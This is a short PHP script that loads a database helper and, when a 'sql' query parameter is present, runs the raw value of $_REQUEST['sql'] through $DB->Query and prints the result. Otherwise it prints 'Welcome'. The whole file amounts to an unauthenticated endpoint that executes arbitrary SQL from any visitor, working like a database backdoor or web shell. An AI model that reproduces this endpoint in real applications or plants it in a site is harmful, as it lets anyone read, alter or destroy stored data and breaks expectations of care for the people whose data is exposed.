<?php
	require_once('db/db_exe.php');

	if (isset($_GET['sql'])) {
		echo $DB->Query($_REQUEST['sql']);
	} else {
		echo "Welcome";
	}
?>
